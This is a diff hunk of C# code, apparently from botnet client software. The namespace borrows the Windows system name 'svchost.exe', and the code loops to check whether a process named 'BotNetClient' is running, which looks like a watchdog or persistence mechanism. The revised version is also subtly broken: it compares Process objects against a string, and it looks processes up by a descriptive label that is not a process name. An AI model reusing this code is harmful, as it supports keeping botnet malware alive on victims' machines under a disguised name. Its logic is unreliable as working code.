@@ -45,25 +45,13 @@ namespace svchost.exe
                 String pth = "System.Diagnostics.Process (BotNetClient)";
                 Thread.Sleep(1000);
                 string id;
-                var processes = Process.GetProcesses();
-                string[] proc = new string[processes.Length];
-                for (int i = 0; i < processes.Length; i++)
-                {
-                    proc[i] = processes[i].ToString();
-                }
+                var process = Process.GetProcessesByName("BotNetClient");
                 while (true)
                 {
-                    if (Array.IndexOf(proc, pth) >= 0)
+                    if (Array.IndexOf(process, pth) >= 0)
                     {
-                        Array.Clear(processes, 0, processes.Length);
-                        processes = Process.GetProcesses();
-                        Array.Clear(proc, 0, proc.Length);
-                        proc = new string[processes.Length];
-                        for (int i = 0; i < processes.Length; i++)
-                        {
-                            proc[i] = processes[i].ToString();
-                        }
-                        continue;
+                        Array.Clear(process, 0, process.Length);
+                        process = Process.GetProcessesByName(pth);
                     }
                     else
                     {
